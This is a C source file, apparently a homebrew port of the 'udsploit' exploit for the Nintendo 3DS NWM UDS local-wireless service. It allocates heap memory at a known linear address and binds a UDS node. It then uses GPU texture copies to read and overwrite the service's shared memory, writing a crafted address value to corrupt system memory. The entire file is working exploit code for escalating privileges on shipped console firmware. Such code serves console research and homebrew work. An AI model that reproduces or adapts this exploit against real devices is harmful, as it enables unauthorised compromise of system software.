#include <string.h>
#include <stdio.h>
#include <malloc.h>

#include <3ds.h>
/*
#include <3ds/services/ndm.h>
#include <3ds/allocator/linear.h>
*/

#include "nwm/uds.h"

// https://github.com/PabloMK7/Luma3DS-Plugin-sample
// http://github.com/devkitPro/libctru/blob/36fe1ada5b7ebe53ba4decda36d764a55f8fefb6/libctru/source/system/allocateHeaps.c
// https://github.com/devkitPro/libctru/blob/36fe1ada5b7ebe53ba4decda36d764a55f8fefb6/libctru/source/system/ctru_init.C

// TEMP, so that we can still allocate memory; this is only needed to run in a 3dsx obviously
extern char* fake_heap_start;
extern char* fake_heap_end;
extern u32 __ctru_heap, __ctru_heap_size, __ctru_linear_heap, __ctru_linear_heap_size;

// https://github.com/devkitPro/libctru/blob/master/libctru/source/system/allocateHeaps.c#63
void __attribute__((weak)) __system_allocateHeaps() {
    u32 tmp = 0;

    __ctru_heap_size = 8 * 1024 * 1024;
    __ctru_linear_heap_size = 8 * 1024 * 1024;

	// Allocate the application heap
    __ctru_heap = 0x08000000;
    svcControlMemory(&tmp, __ctru_heap, 0x0, __ctru_heap_size, MEMOP_ALLOC, MEMPERM_READ | MEMPERM_WRITE);

	// Allocate the linear heap
    svcControlMemory(&__ctru_linear_heap, 0x0, 0x0, __ctru_linear_heap_size, MEMOP_ALLOC_LINEAR, MEMPERM_READ | MEMPERM_WRITE);

    fake_heap_start = (char*)__ctru_heap;
    fake_heap_end = fake_heap_start + __ctru_heap_size;
}

// la == linear address (output)
Result allocHeapWithLa(u32 va, u32 size, u32* la)
{
	Result ret = 0;
	u32 placeholder_addr = __ctru_heap + __ctru_heap_size;
	u32 placeholder_size = 0;
	u32 linear_addr = 0;

	// allocate linear buffer as big as target buffer
	printf("allocate linear buffer as big as target buffer\n");
	ret = svcControlMemory((u32*)&linear_addr, 0, 0, size, 0x10003, 0x3);
	if(ret) return ret;

	// figure out how much memory is available
	printf("figure out how much memory is available\n");
	s64 tmp = 0;
	ret = svcGetSystemInfo(&tmp, 0, 1);
	if(ret) return ret;
	placeholder_size = *(u32*)0x1FF80040 - (u32)tmp; // APPMEMALLOC
	printf("%08X\n", (unsigned int)placeholder_size);

	// allocate placeholder to cover all free memory
	printf("allocate placeholder to cover all free memory\n");
	ret = svcControlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 3, 3);
	if(ret) return ret;

	// free linear block
	printf("free linear block\n");
	ret = svcControlMemory((u32*)&linear_addr, (u32)linear_addr, 0, size, 1, 0);
	if(ret) return ret;

	// allocate regular heap to replace it: we know its PA
	printf("allocate regular heap to replace it\n");
	ret = svcControlMemory((u32*)&va, (u32)va, 0, size, 3, 3);
	if(ret) return ret;

	// free placeholder memory
	printf("free placeholder memory\n");
	ret = svcControlMemory((u32*)&placeholder_addr, (u32)placeholder_addr, 0, placeholder_size, 1, 0);
	if(ret) return ret;

	if(la) *la = linear_addr;

	return 0;
}

Result udsploit()
{
	Result ret = 0;

	const u32 sharedmem_size = 0x1000;
	Handle sharedmem_handle = 0;
	u32 sharedmem_va = 0x0dead000, sharedmem_la = 0;

	printf("udsploit: srvGetServiceHandle\n");
	ret = nwmUdsInit();
	if(ret) goto fail;

	printf("udsploit: srvGetServiceHandle\n");
	ret = ndmuInit();
	if(ret) goto fail;

	{
		printf("udsploit: allocHeapWithPa\n");
		ret = allocHeapWithLa(sharedmem_va, sharedmem_size, &sharedmem_la);
		if(ret)
		{
			sharedmem_va = 0;
			goto fail;
		}

		printf("udsploit: sharedmem_la %08X\n", (unsigned int)sharedmem_la);

		printf("udsploit: svcCreateMemoryBlock\n");
		memset((void*)sharedmem_va, 0, sharedmem_size);
		ret = svcCreateMemoryBlock(&sharedmem_handle, (u32)sharedmem_va, sharedmem_size, 0x0, MEMPERM_READ | MEMPERM_WRITE);
		if(ret) goto fail;
	}

	printf("udsploit: NDMU_EnterExclusiveState\n");
	ret = NDMU_EnterExclusiveState(2); // EXCLUSIVE_STATE_LOCAL_COMMUNICATIONS
	if(ret) goto fail;

	printf("udsploit: NwmUDS_InitializeWithVersion\n");
	uwmNodeInfo nodeinfo = {0};
	ret = NwmUDS_InitializeWithVersion(&nodeinfo, sharedmem_handle, sharedmem_size);
	if(ret) goto fail;

	printf("udsploit: NDMU_LeaveExclusiveState\n");
	ret = NDMU_LeaveExclusiveState();
	if(ret) goto fail;

	printf("udsploit: NwmUDS_Bind\n");
	u32 BindNodeID = 1;
	ret = NwmUDS_Bind(BindNodeID, 0xff0, 1, 0);
	if(ret) goto fail;

	{
		unsigned int* buffer = linearAlloc(sharedmem_size);
		if(buffer == NULL)
		{
			printf("udsploit: linearAlloc failed\n");
			ret = -1;
			goto fail;
		}

		GSPGPU_InvalidateDataCache(buffer, sharedmem_size);

		svcSleepThread(1 * 1000 * 1000);
		GX_TextureCopy((void*)sharedmem_la, 0, (void*)buffer, 0, sharedmem_size, 8);
		svcSleepThread(1 * 1000 * 1000);

		int i;
		for(i = 0; i < 8; i++) printf("%08X %08X %08X %08X\n", buffer[i * 4 + 0], buffer[i * 4 + 1], buffer[i * 4 + 2], buffer[i * 4 + 3]);
						
		buffer[3] = 0x1EC40140 - 8;

		GSPGPU_FlushDataCache(buffer, sharedmem_size);
		GX_TextureCopy((void*)buffer, 0, (void*)sharedmem_la, 0, sharedmem_size, 8);
		svcSleepThread(1 * 1000 * 1000);

		linearFree(buffer);
	}

	printf("udsploit: NwmUDS_Unbind\n");
	ret = NwmUDS_Unbind(BindNodeID);
	if(ret) goto fail;

	fail:
	nwmUdsExit();
	ndmuExit();
	if(sharedmem_handle) svcCloseHandle(sharedmem_handle);
	if(sharedmem_va) svcControlMemory((u32*)&sharedmem_va, (u32)sharedmem_va, 0, sharedmem_size, 0x1, 0);
	return ret;
}

